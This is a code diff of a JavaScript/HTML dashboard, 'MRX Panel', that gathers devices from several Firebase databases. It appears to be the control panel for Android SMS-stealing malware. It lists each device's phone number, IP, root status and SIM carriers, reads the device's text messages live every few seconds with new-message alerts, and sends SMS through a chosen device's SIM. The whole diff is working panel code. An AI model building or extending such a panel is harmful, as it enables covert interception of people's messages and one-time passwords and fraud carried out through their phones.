+            <div class="stat s1"><div class="stat-val" id="stTotal">0</div><div class="stat-lbl">Total Devices</div></div>
+            <div class="stat s2"><div class="stat-val" id="stOnline">0</div><div class="stat-lbl">Online</div></div>
+            <div class="stat s3"><div class="stat-val" id="stOffline">0</div><div class="stat-lbl">Offline</div></div>
+            <div class="stat s4"><div class="stat-val" id="stSims">0</div><div class="stat-lbl">Total SIMs</div></div>
+          </div>
           <div class="section-head"><h3 id="sectionTitle">All Devices</h3></div>
           <div class="dev-grid" id="deviceGrid">
-            <div class="loading" style="grid-column:1/-1;"><div class="spinner"></div> Loading devices...</div>
+            <div class="loading" style="grid-column:1/-1;"><div class="spinner"></div> Loading...</div>
+          </div>
+        </div>
+        <div class="pane" id="pane-device">
+          <div class="placeholder" id="detPlaceholder">
+            <div class="pi">📱</div><p>Select a device from the sidebar</p>
+          </div>
+          <div id="detContent" style="display:none"></div>
+        </div>
+        <div class="pane" id="pane-messages">
+          <div class="placeholder" id="msgPlaceholder">
+            <div class="pi">💬</div><p>Select a device from the sidebar</p>
+          </div>
+          <div id="msgContent" style="display:none">
+            <div class="msg-topbar">
+              <div style="display:flex;align-items:center;gap:8px">
+                <div class="msg-devname" id="msgDevName">Messages</div>
+                <div class="msg-counter" id="msgCounter">0 messages</div>
+              </div>
+              <div style="display:flex;align-items:center;gap:7px">
+                <button class="msg-refresh-btn" id="msgRefreshBtn">↺ Refresh</button>
+                <div class="live-badge"><div class="ld"></div> LIVE</div>
+              </div>
+            </div>
+            <div class="msg-sim-bar" id="msgSimBar">
+              <div class="msb-sim">
+                <div class="msb-dot s1"></div>
+                <div class="msb-info">
+                  <div class="msb-label">SIM 1</div>
+                  <div class="msb-num" id="msgSim1Num">—</div>
+                  <div class="msb-carrier" id="msgSim1Carrier">—</div>
+                </div>
+              </div>
+              <div class="msb-divider"></div>
+              <div class="msb-sim">
+                <div class="msb-dot s2"></div>
+                <div class="msb-info">
+                  <div class="msb-label">SIM 2</div>
+                  <div class="msb-num" id="msgSim2Num">—</div>
+                  <div class="msb-carrier" id="msgSim2Carrier">—</div>
+                </div>
+              </div>
+            </div>
+            <div class="msg-bar">
+              <div class="msg-sbox">
+                <span style="color:var(--dim)">⌕</span>
+                <input id="msgSearch" placeholder="Search messages..."/>
+              </div>
+              <button class="mfbtn ma" id="mf-all" data-mf="all">All</button>
+              <button class="mfbtn" id="mf-incoming" data-mf="incoming">In</button>
+              <button class="mfbtn" id="mf-outgoing" data-mf="outgoing">Out</button>
+            </div>
+            <div id="msgList" class="msg-list"></div>
+          </div>
+        </div>
+        <div class="pane" id="pane-sendsms">
+          <div class="send-wrap">
+            <div class="send-card">
+              <div class="send-title">Send SMS</div>
+              <div class="send-sub">Route a message through selected device</div>
+              <div class="dev-disp" id="devDisp">
+                <div class="dd-dot d-off"></div>
+                <div><div class="dd-name">No device selected</div><div class="dd-id">Pick a device from the sidebar</div></div>
+              </div>
+              <div class="sim-tog">
+                <div class="sim-col">
+                  <button class="stb s1" id="sb1">SIM 1</button>
+                  <div class="sim-numrow"><span class="sim-numtxt" id="sim1num">—</span><button class="copybtn" id="copy1">Copy</button></div>
+                </div>
+                <div class="sim-col">
+                  <button class="stb" id="sb2">SIM 2</button>
+                  <div class="sim-numrow"><span class="sim-numtxt" id="sim2num">—</span><button class="copybtn" id="copy2">Copy</button></div>
+                </div>
+              </div>
+              <label style="font-size:10px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--sub);margin-bottom:7px;display:block;">To (Phone Number)</label>
+              <input id="sendTo" class="send-inp" placeholder="+91 9876543210"/>
+              <label style="font-size:10px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--sub);margin-bottom:7px;display:block;">Message</label>
+              <textarea id="sendMsg" class="send-area" placeholder="Type your message..."></textarea>
+              <button class="send-btn" id="sendBtn">📤 Send SMS</button>
+              <div class="send-res" id="sendRes"></div>
+            </div>
           </div>
         </div>
       </div>
@@ -268,27 +440,24 @@ body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;bac
   </div>
 </div>
 
-<!-- MODAL -->
-<div class="overlay" id="detailModal">
-  <div class="modal">
-    <div class="modal-title" id="modalTitle">Device</div>
-    <div id="modalBody"></div>
-    <div class="modal-btns">
-      <button class="mc" id="closeModalBtn">Close</button>
-    </div>
-  </div>
-</div>
-
 <div class="toast" id="toast"></div>
-
 <script>
 // ═══════ STATE ═══════
 let FIREBASES = [];
 let allDevices = [];
 let filteredDevices = [];
 let currentFB = 'all';
+let currentFilter = 'all';
 let currentSearch = '';
+let currentTab = 'overview';
+let selDev = null;
+let allMsgs = [];
+let msgFilter = 'all';
+let msgSearch = '';
+let curSim = 1;
 let devicePollTimer = null;
+let msgPollTimer = null;
+let lastMsgKeys = new Set();
 
 // ═══════ HELPERS ═══════
 function $(id) { return document.getElementById(id); }
@@ -296,8 +465,7 @@ function esc(s) {
   return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
 function toast(msg) {
-  const t = $('toast');
-  t.textContent = msg;
+  const t = $('toast'); t.textContent = msg;
   t.classList.add('show');
   setTimeout(() => t.classList.remove('show'), 2500);
 }
@@ -313,8 +481,6 @@ function formatPhone(num) {
   if (s.length > 0) return '+' + s;
   return '—';
 }
-
-// ═══════ BUILD URL (auth optional) ═══════
 function buildUrl(fb, path) {
   const base = fb.url.replace(/\/$/, '');
   if (fb.key && String(fb.key).trim()) {
@@ -325,90 +491,100 @@ function buildUrl(fb, path) {
 
 // ═══════ BOOT ═══════
 document.addEventListener('DOMContentLoaded', () => {
-  console.log('🚀 MRX Panel booting...');
-
+  console.log('🚀 MRX booting...');
   const accessInput = $('accessInput');
   const loginBtn = $('loginBtn');
-  const logoutBtn = $('logoutBtn');
-  const refreshBtn = $('refreshBtn');
-  const closeModalBtn = $('closeModalBtn');
-  const globalSearch = $('globalSearch');
-
-  if (!accessInput || !loginBtn) {
-    console.error('❌ CRITICAL: login elements missing');
-    document.body.innerHTML = '<div style="padding:40px;color:#f43f5e;font-family:monospace;">❌ HTML broken: login elements missing.</div>';
-    return;
-  }
+  if (!accessInput || !loginBtn) return;
 
   loginBtn.addEventListener('click', doLogin);
   accessInput.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
-  if (logoutBtn) logoutBtn.addEventListener('click', logout);
-  if (refreshBtn) refreshBtn.addEventListener('click', refreshAll);
-  if (closeModalBtn) closeModalBtn.addEventListener('click', () => closeModal('detailModal'));
-  if (globalSearch) globalSearch.addEventListener('input', () => { currentSearch = globalSearch.value.toLowerCase().trim(); applyFilter(); });
-
-  const modal = $('detailModal');
-  if (modal) modal.addEventListener('click', e => { if (e.target === modal) closeModal('detailModal'); });
-
-  document.addEventListener('keydown', e => {
-    if (e.key === 'Escape') document.querySelectorAll('.overlay.open').forEach(o => o.classList.remove('open'));
+  $('logoutBtn').addEventListener('click', logout);
+  $('refreshBtn').addEventListener('click', refreshAll);
+  $('globalSearch').addEventListener('input', () => {
+    currentSearch = $('globalSearch').value.toLowerCase().trim();
+    applyFilter();
   });
 
-  const saved = sessionStorage.getItem('mrx_access');
-  if (saved) {
-    accessInput.value = saved;
-    doLogin();
-  }
+  document.querySelectorAll('.fchip').forEach(chip => {
+    chip.addEventListener('click', () => {
+      currentFilter = chip.dataset.f;
+      document.querySelectorAll('.fchip').forEach(c => {
+        c.classList.remove('active', 'on', 'off');
+        if (c.dataset.f === currentFilter) {
+          c.classList.add('active');
+          if (currentFilter === 'online') c.classList.add('on');
+          if (currentFilter === 'offline') c.classList.add('off');
+        }
+      });
+      applyFilter();
+    });
+  });
 
-  console.log('✅ MRX Panel ready');
+  document.querySelectorAll('.tab').forEach(t => {
+    t.addEventListener('click', () => switchTab(t.dataset.tab));
+  });
+
+  $('msgSearch').addEventListener('input', () => {
+    msgSearch = $('msgSearch').value.toLowerCase().trim();
+    renderMessages();
+  });
+
+  document.querySelectorAll('#mf-all,#mf-incoming,#mf-outgoing').forEach(b => {
+    b.addEventListener('click', () => {
+      msgFilter = b.dataset.mf;
+      document.querySelectorAll('.mfbtn').forEach(x => x.classList.remove('ma'));
+      b.classList.add('ma');
+      renderMessages();
+    });
+  });
+
+  $('msgRefreshBtn').addEventListener('click', () => {
+    if (selDev) loadMessages(selDev, true);
+  });
+
+  // Send SMS
+  $('sendBtn').addEventListener('click', sendSms);
+  $('sb1').addEventListener('click', () => selSim(1));
+  $('sb2').addEventListener('click', () => selSim(2));
+  $('copy1').addEventListener('click', () => copySimNum(1));
+  $('copy2').addEventListener('click', () => copySimNum(2));
+
+  const saved = sessionStorage.getItem('mrx_access');
+  if (saved) { accessInput.value = saved; doLogin(); }
+  console.log('✅ MRX ready');
 });
 
 // ═══════ LOGIN ═══════
 async function doLogin() {
-  const btn = $('loginBtn');
-  const errEl = $('loginErr');
+  const btn = $('loginBtn'); const errEl = $('loginErr');
   const input = $('accessInput').value.trim();
-
   errEl.style.display = 'none';
-
-  if (!input) {
-    errEl.textContent = 'Please enter access key';
-    errEl.style.display = 'block';
-    return;
-  }
-
-  btn.disabled = true;
-  btn.textContent = 'Verifying...';
+  if (!input) { errEl.textContent = 'Enter access key'; errEl.style.display = 'block'; return; }
+  btn.disabled = true; btn.textContent = 'Verifying...';
 
   try {
-    const accessRes = await fetch('access.json?t=' + Date.now());
-    if (!accessRes.ok) throw new Error('access.json not found');
-    const accessData = await accessRes.json();
+    const aRes = await fetch('access.json?t=' + Date.now());
+    if (!aRes.ok) throw new Error('access.json not found');
+    const aData = await aRes.json();
+    if (input !== aData.accessKey) throw new Error('Invalid access key');
 
-    if (input !== accessData.accessKey) throw new Error('Invalid access key');
-
-    const fbRes = await fetch('firebase.json?t=' + Date.now());
-    if (!fbRes.ok) throw new Error('firebase.json not found');
-    const fbData = await fbRes.json();
-
-    if (!fbData.firebases || !Array.isArray(fbData.firebases) || fbData.firebases.length === 0) {
+    const fRes = await fetch('firebase.json?t=' + Date.now());
+    if (!fRes.ok) throw new Error('firebase.json not found');
+    const fData = await fRes.json();
+    if (!fData.firebases || !Array.isArray(fData.firebases) || !fData.firebases.length)
       throw new Error('No firebases configured');
-    }
 
-    FIREBASES = fbData.firebases;
+    FIREBASES = fData.firebases;
     sessionStorage.setItem('mrx_access', input);
-
     $('loginScreen').style.display = 'none';
     $('dashboard').classList.add('open');
 
     renderFBList();
     await loadAllDevices();
     startDevicePoll();
-
   } catch (e) {
     errEl.textContent = '❌ ' + e.message;
     errEl.style.display = 'block';
-    console.error('Login error:', e);
   }
 
   btn.disabled = false;
@@ -423,97 +599,66 @@ function logout() {
 // ═══════ FB LIST ═══════
 function renderFBList() {
   const el = $('fbList');
-  const allCount = allDevices.length;
-
   let html = `
     <div class="fb-item${currentFB === 'all' ? ' active' : ''}" data-fb="all">
       <div class="fdot"></div>
       <div class="fname">All Firebases</div>
-      <div class="fcount">${allCount}</div>
-    </div>
-  `;
-
+      <div class="fcount">${allDevices.length}</div>
+    </div>`;
   html += FIREBASES.map((fb, i) => {
     const count = allDevices.filter(d => d._fb.name === fb.name).length;
-    return `
-      <div class="fb-item${currentFB === i ? ' active' : ''}" data-fb="${i}">
-        <div class="fdot"></div>
-        <div class="fname">${esc(fb.name)}</div>
-        <div class="fcount">${count}</div>
-      </div>
-    `;
+    return `<div class="fb-item${currentFB === i ? ' active' : ''}" data-fb="${i}">
+      <div class="fdot"></div>
+      <div class="fname">${esc(fb.name)}</div>
+      <div class="fcount">${count}</div>
+    </div>`;
   }).join('');
-
   el.innerHTML = html;
-
   el.querySelectorAll('.fb-item').forEach(item => {
     item.addEventListener('click', () => {
-      const val = item.dataset.fb;
-      currentFB = val === 'all' ? 'all' : parseInt(val);
-      renderFBList();
-      applyFilter();
+      currentFB = item.dataset.fb === 'all' ? 'all' : parseInt(item.dataset.fb);
+      renderFBList(); applyFilter();
     });
   });
 }
 
-// ═══════ LOAD DEVICES ═══════
+// ═══════ DEVICES ═══════
 async function loadAllDevices() {
   allDevices = [];
-
-  const results = await Promise.allSettled(
-    FIREBASES.map(fb => fetchDevicesFromFB(fb))
-  );
-
+  const results = await Promise.allSettled(FIREBASES.map(fetchDevicesFromFB));
   results.forEach((r, i) => {
-    if (r.status === 'fulfilled' && Array.isArray(r.value)) {
-      allDevices.push(...r.value);
-    } else {
-      console.warn('❌ Failed to load', FIREBASES[i].name, r.reason);
-    }
+    if (r.status === 'fulfilled' && Array.isArray(r.value)) allDevices.push(...r.value);
+    else console.warn('❌ Failed', FIREBASES[i].name, r.reason);
   });
-
-  renderStats();
-  renderFBList();
-  applyFilter();
+  renderStats(); renderFBList(); applyFilter();
 }
 
 async function fetchDevicesFromFB(fb) {
   const url = buildUrl(fb, 'clients');
   const res = await fetch(url, { signal: AbortSignal.timeout(15000) });
   if (!res.ok) throw new Error('HTTP ' + res.status);
-  const data = await res.json();
-  return parseDevices(data, fb);
+  return parseDevices(await res.json(), fb);
 }
 
 function parseDevices(data, fb) {
   const devs = [];
   if (!data || typeof data !== 'object') return devs;
-
   Object.entries(data).forEach(([id, d]) => {
     if (!d || typeof d !== 'object') return;
     const sims = Array.isArray(d.sims) ? d.sims : (d.sims && typeof d.sims === 'object' ? Object.values(d.sims) : []);
-
     devs.push({
-      id, fbKey: id,
-      name: d.modelName || d.model || d.deviceName || id,
-      batteryRaw: d.battery ?? '—',
-      batteryNum: parseBattery(d.battery),
+      id, name: d.modelName || d.model || d.deviceName || id,
+      batteryRaw: d.battery ?? '—', batteryNum: parseBattery(d.battery),
       status: !!d.status,
       mobNo: formatPhone(d.mobNo || (sims[0]?.phoneNumber || '')),
-      ip: d.ip_address || '—',
-      android: d.androidV || '—',
-      storage: d.storage || '—',
-      joined: d.joined || '—',
-      sdkV: d.sdkV || '—',
-      cpuArch: d.cpu_arch || '—',
-      isRoot: !!d.isRoot,
-      isSdCard: !!d.isSdCard,
+      ip: d.ip_address || '—', android: d.androidV || '—',
+      storage: d.storage || '—', joined: d.joined || '—',
+      sdkV: d.sdkV || '—', cpuArch: d.cpu_arch || '—',
+      isRoot: !!d.isRoot, isSdCard: !!d.isSdCard,
       serviceProvider: d.service_provider || '',
-      sims,
-      _fb: fb,
+      sims, _fb: fb
     });
   });
-
   return devs;
 }
 
@@ -523,16 +668,10 @@ function renderStats() {
   const on = allDevices.filter(d => d.status).length;
   const off = total - on;
   const sims = allDevices.reduce((a, d) => a + d.sims.length, 0);
-
-  $('stTotal').textContent = total;
-  $('stOnline').textContent = on;
-  $('stOffline').textContent = off;
-  $('stSims').textContent = sims;
-
-  $('pT').textContent = total;
-  $('pOn').textContent = on;
-  $('pOff').textContent = off;
-  $('pFB').textContent = FIREBASES.length;
+  $('stTotal').textContent = total; $('stOnline').textContent = on;
+  $('stOffline').textContent = off; $('stSims').textContent = sims;
+  $('pT').textContent = total; $('pOn').textContent = on;
+  $('pOff').textContent = off; $('pFB').textContent = FIREBASES.length;
 }
 
 // ═══════ FILTER ═══════
@@ -542,12 +681,13 @@ function applyFilter() {
     const fbName = FIREBASES[currentFB].name;
     list = list.filter(d => d._fb.name === fbName);
   }
+  if (currentFilter === 'online') list = list.filter(d => d.status);
+  if (currentFilter === 'offline') list = list.filter(d => !d.status);
   if (currentSearch) {
     list = list.filter(d =>
       d.name.toLowerCase().includes(currentSearch) ||
       d.id.toLowerCase().includes(currentSearch) ||
-      d.mobNo.toLowerCase().includes(currentSearch)
-    );
+      d.mobNo.toLowerCase().includes(currentSearch));
   }
   filteredDevices = list;
   renderDeviceGrid();
@@ -557,72 +697,61 @@ function applyFilter() {
 // ═══════ GRID ═══════
 function renderDeviceGrid() {
   const el = $('deviceGrid');
-  const titleEl = $('sectionTitle');
-
   if (!filteredDevices.length) {
-    titleEl.textContent = 'All Devices';
-    el.innerHTML = `<div class="empty" style="grid-column:1/-1;"><p>No devices found</p></div>`;
+    $('sectionTitle').textContent = 'Devices';
+    el.innerHTML = `<div class="empty" style="grid-column:1/-1;"><p>No devices</p></div>`;
     return;
   }
-
-  titleEl.textContent = `Devices (${filteredDevices.length})`;
-
+  $('sectionTitle').textContent = `Devices (${filteredDevices.length})`;
   el.innerHTML = filteredDevices.map(d => {
     const bv = d.batteryNum;
     const bc = isNaN(bv) ? 'var(--dim)' : bv >= 60 ? 'var(--emerald)' : bv >= 30 ? 'var(--amber)' : 'var(--rose)';
     const bp = isNaN(bv) ? 0 : Math.min(100, Math.max(0, bv));
     const bd = isNaN(bv) ? d.batteryRaw : bv + '%';
-    return `
-      <div class="dev-card" data-fb="${esc(d._fb.name)}" data-id="${esc(d.id)}">
-        <div class="dev-card-fb">${esc(d._fb.name)}</div>
-        <div class="dev-card-head">
-          <div style="min-width:0;flex:1;">
-            <div class="dev-card-name">${esc(d.name)}</div>
-            <div class="dev-card-num">${esc(d.mobNo)}</div>
-          </div>
-          <div class="dev-card-status ${d.status ? 'on' : 'off'}">${d.status ? 'Online' : 'Offline'}</div>
+    return `<div class="dev-card" data-fb="${esc(d._fb.name)}" data-id="${esc(d.id)}">
+      <div class="dev-card-fb">${esc(d._fb.name)}</div>
+      <div class="dev-card-head">
+        <div style="min-width:0;flex:1;">
+          <div class="dev-card-name">${esc(d.name)}</div>
+          <div class="dev-card-num">${esc(d.mobNo)}</div>
         </div>
-        <div class="dev-card-foot">
-          <div class="dev-batt-bar"><div class="dev-batt-fill" style="width:${bp}%;background:${bc};"></div></div>
-          <div class="dev-batt-txt" style="color:${bc};">${bd}</div>
-        </div>
+        <div class="dev-card-status ${d.status ? 'on' : 'off'}">${d.status ? 'Online' : 'Offline'}</div>
       </div>
-    `;
+      <div class="dev-card-foot">
+        <div class="dev-batt-bar"><div class="dev-batt-fill" style="width:${bp}%;background:${bc};"></div></div>
+        <div class="dev-batt-txt" style="color:${bc};">${bd}</div>
+      </div>
+    </div>`;
   }).join('');
-
-  el.querySelectorAll('.dev-card').forEach(card => {
-    card.addEventListener('click', () => openDevice(card.dataset.fb, card.dataset.id));
+  el.querySelectorAll('.dev-card').forEach(c => {
+    c.addEventListener('click', () => selectDevice(c.dataset.fb, c.dataset.id));
   });
 }
 
 // ═══════ SIDEBAR ═══════
 function renderSidebarDevices() {
   const el = $('devList');
-
   if (!filteredDevices.length) {
     el.innerHTML = `<div class="dev-empty"><div>No devices</div></div>`;
     return;
   }
-
   el.innerHTML = filteredDevices.map(d => {
     const bv = d.batteryNum;
     const bc = isNaN(bv) ? 'var(--dim)' : bv >= 60 ? 'var(--emerald)' : bv >= 30 ? 'var(--amber)' : 'var(--rose)';
     const bs = isNaN(bv) ? `color:var(--sub);background:rgba(255,255,255,.05)` : `color:${bc};background:${bc}22`;
     const bd = isNaN(bv) ? d.batteryRaw : bv + '%';
-    return `
-      <div class="dev-item" data-fb="${esc(d._fb.name)}" data-id="${esc(d.id)}">
-        <div class="dev-dot ${d.status ? 'on' : 'off'}"></div>
-        <div class="dev-meta">
-          <div class="dev-name">${esc(d.name)}</div>
-          <div class="dev-num">${esc(d.mobNo)}</div>
-        </div>
-        <div class="dev-batt" style="${bs}">${bd}</div>
+    const isSel = selDev && selDev.id === d.id && selDev._fb.name === d._fb.name;
+    return `<div class="dev-item${isSel ? ' active' : ''}" data-fb="${esc(d._fb.name)}" data-id="${esc(d.id)}">
+      <div class="dev-dot ${d.status ? 'on' : 'off'}"></div>
+      <div class="dev-meta">
+        <div class="dev-name">${esc(d.name)}</div>
+        <div class="dev-num">${esc(d.mobNo)}</div>
       </div>
-    `;
+      <div class="dev-batt" style="${bs}">${bd}</div>
+    </div>`;
   }).join('');
-
   el.querySelectorAll('.dev-item').forEach(item => {
-    item.addEventListener('click', () => openDevice(item.dataset.fb, item.dataset.id));
+    item.addEventListener('click', () => selectDevice(item.dataset.fb, item.dataset.id));
   });
 }
 
@@ -642,92 +771,153 @@ async function refreshAll() {
   toast('✅ Refreshed');
 }
 
+// ═══════ TABS ═══════
+function switchTab(name) {
+  currentTab = name;
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === name));
+  document.querySelectorAll('.pane').forEach(p => p.classList.remove('active'));
+  $('pane-' + name).classList.add('active');
+
+  if (name === 'messages' && selDev) {
+    startMsgPoll();
+  } else {
+    stopMsgPoll();
+  }
+}
+
+// ═══════ SELECT DEVICE ═══════
+function selectDevice(fbName, deviceId) {
+  selDev = allDevices.find(d => d._fb.name === fbName && d.id === deviceId);
+  if (!selDev) return;
+  renderSidebarDevices();
+  renderDetail();
+  updateDevDisp();
+  switchTab('device');
+
+  // Auto-load messages in bg
+  if (selDev) {
+    allMsgs = []; lastMsgKeys = new Set();
+    loadMessages(selDev, false);
+  }
+}
+
 // ═══════ DEVICE DETAIL ═══════
-async function openDevice(fbName, deviceId) {
-  const dev = allDevices.find(d => d._fb.name === fbName && d.id === deviceId);
-  if (!dev) return;
+function renderDetail() {
+  if (!selDev) return;
+  const d = selDev;
+  $('detPlaceholder').style.display = 'none';
+  const dc = $('detContent'); dc.style.display = 'block';
 
-  $('modalTitle').textContent = dev.name;
-
-  const bv = dev.batteryNum;
+  const bv = d.batteryNum;
   const bc = isNaN(bv) ? 'var(--dim)' : bv >= 60 ? 'var(--emerald)' : bv >= 30 ? 'var(--amber)' : 'var(--rose)';
-  const bd = isNaN(bv) ? dev.batteryRaw : bv + '%';
+  const bd = isNaN(bv) ? d.batteryRaw : bv + '%';
 
-  $('modalBody').innerHTML = `
+  dc.innerHTML = `
     <div class="detail-head">
       <div class="detail-icon">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="3"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
       </div>
       <div class="detail-meta">
-        <div class="detail-name">${esc(dev.name)}</div>
+        <div class="detail-name">${esc(d.name)}</div>
         <div class="detail-badges">
-          <span class="dbadge ${dev.status ? 'on' : 'off'}">${dev.status ? '● Online' : '● Offline'}</span>
-          ${dev.isRoot ? '<span class="dbadge amber">⚡ Root</span>' : ''}
-          ${dev.isSdCard ? '<span class="dbadge cyan">💾 SD</span>' : ''}
-          ${dev.sims.length ? `<span class="dbadge purp">${dev.sims.length} SIM${dev.sims.length > 1 ? 's' : ''}</span>` : ''}
-          <span class="dbadge purp">${esc(dev._fb.name)}</span>
+          <span class="dbadge ${d.status ? 'on' : 'off'}">${d.status ? '● Online' : '● Offline'}</span>
+          ${d.isRoot ? '<span class="dbadge amber">⚡ Root</span>' : ''}
+          ${d.isSdCard ? '<span class="dbadge cyan">💾 SD</span>' : ''}
+          ${d.sims.length ? `<span class="dbadge purp">${d.sims.length} SIM</span>` : ''}
+          <span class="dbadge purp">${esc(d._fb.name)}</span>
         </div>
       </div>
     </div>
     <div class="detail-grid">
-      <div class="dcard"><div class="dcard-lbl">Phone Number</div><div class="dcard-val phone">${esc(dev.mobNo)}</div></div>
-      <div class="dcard"><div class="dcard-lbl">IP Address</div><div class="dcard-val ip">${esc(dev.ip)}</div></div>
+      <div class="dcard"><div class="dcard-lbl">Phone</div><div class="dcard-val phone">${esc(d.mobNo)}</div></div>
+      <div class="dcard"><div class="dcard-lbl">IP</div><div class="dcard-val ip">${esc(d.ip)}</div></div>
       <div class="dcard"><div class="dcard-lbl">Battery</div><div class="dcard-val" style="color:${bc};">${bd}</div></div>
-      <div class="dcard"><div class="dcard-lbl">Android</div><div class="dcard-val">${esc(dev.android)}</div></div>
-      <div class="dcard"><div class="dcard-lbl">SDK</div><div class="dcard-val mono">${esc(dev.sdkV)}</div></div>
-      <div class="dcard"><div class="dcard-lbl">CPU</div><div class="dcard-val mono">${esc(dev.cpuArch)}</div></div>
-      <div class="dcard"><div class="dcard-lbl">Storage</div><div class="dcard-val">${esc(String(dev.storage))}</div></div>
-      <div class="dcard"><div class="dcard-lbl">Provider</div><div class="dcard-val" style="color:var(--c);">${esc(dev.serviceProvider || '—')}</div></div>
-      <div class="dcard"><div class="dcard-lbl">Joined</div><div class="dcard-val mono" style="font-size:11px;">${esc(String(dev.joined))}</div></div>
-      <div class="dcard"><div class="dcard-lbl">Device ID</div><div class="dcard-val mono" style="font-size:10px;">${esc(dev.id)}</div></div>
-    </div>
-    ${dev.sims.length ? `
-      <div class="section-head" style="margin-top:18px;"><h3>SIM Cards</h3></div>
-      <div class="detail-grid">
-        ${dev.sims.map((s, i) => `
-          <div class="dcard">
-            <div class="dcard-lbl" style="color:${i === 0 ? 'var(--c)' : 'var(--p)'};">SIM ${i + 1}</div>
-            <div class="dcard-val phone">${esc(formatPhone(s.phoneNumber || s.phone || ''))}</div>
-            <div class="dcard-val" style="font-size:11px;color:var(--sub);margin-top:6px;">${esc(s.carrierName || s.carrier || '—')}</div>
-          </div>
-        `).join('')}
-      </div>
-    ` : ''}
-    <div class="section-head" style="margin-top:22px;"><h3>Messages</h3></div>
-    <div id="modalMsgs"><div class="loading"><div class="spinner"></div> Loading messages...</div></div>
-  `;
-
-  $('detailModal').classList.add('open');
-  loadMessages(dev);
+      <div class="dcard"><div class="dcard-lbl">Android</div><div class="dcard-val">${esc(d.android)}</div></div>
+      <div class="dcard"><div class="dcard-lbl">SDK</div><div class="dcard-val mono">${esc(d.sdkV)}</div></div>
+      <div class="dcard"><div class="dcard-lbl">CPU</div><div class="dcard-val mono">${esc(d.cpuArch)}</div></div>
+      <div class="dcard"><div class="dcard-lbl">Storage</div><div class="dcard-val">${esc(String(d.storage))}</div></div>
+      <div class="dcard"><div class="dcard-lbl">Provider</div><div class="dcard-val" style="color:var(--c);">${esc(d.serviceProvider || '—')}</div></div>
+      <div class="dcard"><div class="dcard-lbl">Joined</div><div class="dcard-val mono" style="font-size:11px;">${esc(String(d.joined))}</div></div>
+      <div class="dcard"><div class="dcard-lbl">Device ID</div><div class="dcard-val mono" style="font-size:10px;">${esc(d.id)}</div></div>
+    </div>`;
 }
 
-async function loadMessages(dev) {
-  const el = $('modalMsgs');
+// ═══════ MESSAGES ═══════
+function startMsgPoll() {
+  stopMsgPoll();
+  if (!selDev) return;
+  msgPollTimer = setInterval(() => loadMessages(selDev, true), 3000);
+}
+function stopMsgPoll() {
+  if (msgPollTimer) { clearInterval(msgPollTimer); msgPollTimer = null; }
+}
+
+async function loadMessages(dev, isAuto) {
+  if (!dev) return;
+  const el = $('msgList');
+
+  if (!isAuto) {
+    $('msgPlaceholder').style.display = 'none';
+    $('msgContent').style.display = 'block';
+    el.innerHTML = `<div class="loading"><div class="spinner"></div> Loading...</div>`;
+    $('msgDevName').textContent = dev.name;
+    updateMsgSimBar();
+  }
+
   try {
     const url = buildUrl(dev._fb, 'messages/' + dev.id);
-    const res = await fetch(url, { signal: AbortSignal.timeout(15000) });
+    const res = await fetch(url, { signal: AbortSignal.timeout(10000) });
     if (!res.ok) throw new Error('HTTP ' + res.status);
     const data = await res.json();
 
     const msgs = parseMessages(data);
-    if (!msgs.length) {
-      el.innerHTML = `<div class="empty" style="padding:30px;"><p>No messages yet</p></div>`;
-      return;
+    const newKeys = new Set(msgs.map(m => m.key));
+    let hasNew = false;
+    if (isAuto) {
+      for (const m of msgs) if (!lastMsgKeys.has(m.key)) { hasNew = true; break; }
     }
+    lastMsgKeys = newKeys;
+    allMsgs = msgs;
+    $('msgCounter').textContent = msgs.length + ' message' + (msgs.length === 1 ? '' : 's');
+    renderMessages(hasNew);
 
-    el.innerHTML = `<div class="msg-list">${msgs.slice(0, 100).map(m => `
-      <div class="msg ${m.type === 'outgoing' ? 'out' : 'in'}">
-        <div class="msg-head">
-          <span class="msg-from">${esc(m.sender)}</span>
-          <span class="msg-type ${m.type === 'outgoing' ? 'out' : 'in'}">${m.type}</span>
-          <span class="msg-time">${esc(m.dateTime)}</span>
-        </div>
-        <div class="msg-text">${esc(m.message)}</div>
-      </div>
-    `).join('')}</div>`;
+    if (hasNew && isAuto) toast('💬 New message!');
   } catch (e) {
-    el.innerHTML = `<div class="empty" style="padding:30px;"><p>⚠ Failed to load messages</p></div>`;
+    if (!isAuto) el.innerHTML = `<div class="empty"><p>⚠ Failed to load</p></div>`;
   }
+}
+
+function renderMessages(hasNew = false) {
+  const el = $('msgList');
+  let list = allMsgs;
+  if (msgFilter === 'incoming') list = list.filter(m => m.type === 'incoming');
+  if (msgFilter === 'outgoing') list = list.filter(m => m.type === 'outgoing');
+  if (msgSearch) list = list.filter(m => m.message.toLowerCase().includes(msgSearch) || m.sender.toLowerCase().includes(msgSearch));
+
+  if (!list.length) {
+    el.innerHTML = `<div class="empty"><p>No messages</p></div>`;
+    return;
+  }
+  el.innerHTML = list.slice(0, 200).map((m, i) => `
+    <div class="msg ${m.type === 'outgoing' ? 'out' : 'in'}${hasNew && i < 3 ? ' new' : ''}">
+      <div class="msg-head">
+        <span class="msg-from">${esc(m.sender)}</span>
+        <span class="msg-type ${m.type === 'outgoing' ? 'out' : 'in'}">${m.type}</span>
+        <span class="msg-time">${esc(m.dateTime)}</span>
+      </div>
+      <div class="msg-text">${esc(m.message)}</div>
+    </div>
+  `).join('');
+}
+
+function updateMsgSimBar() {
+  if (!selDev) return;
+  const d = selDev;
+  const s1 = d.sims[0], s2 = d.sims[1];
+  $('msgSim1Num').textContent = formatPhone(s1?.phoneNumber || s1?.phone || '');
+  $('msgSim2Num').textContent = s2 ? formatPhone(s2.phoneNumber || s2.phone || '') : 'No SIM';
+  $('msgSim1Carrier').textContent = s1?.carrierName || s1?.carrier || d.serviceProvider || '—';
+  $('msgSim2Carrier').textContent = s2?.carrierName || s2?.carrier || '—';
 }
 
 function parseMessages(data) {
@@ -737,7 +927,7 @@ function parseMessages(data) {
   entries.forEach(([k, m]) => {
     if (m === null || m === undefined) return;
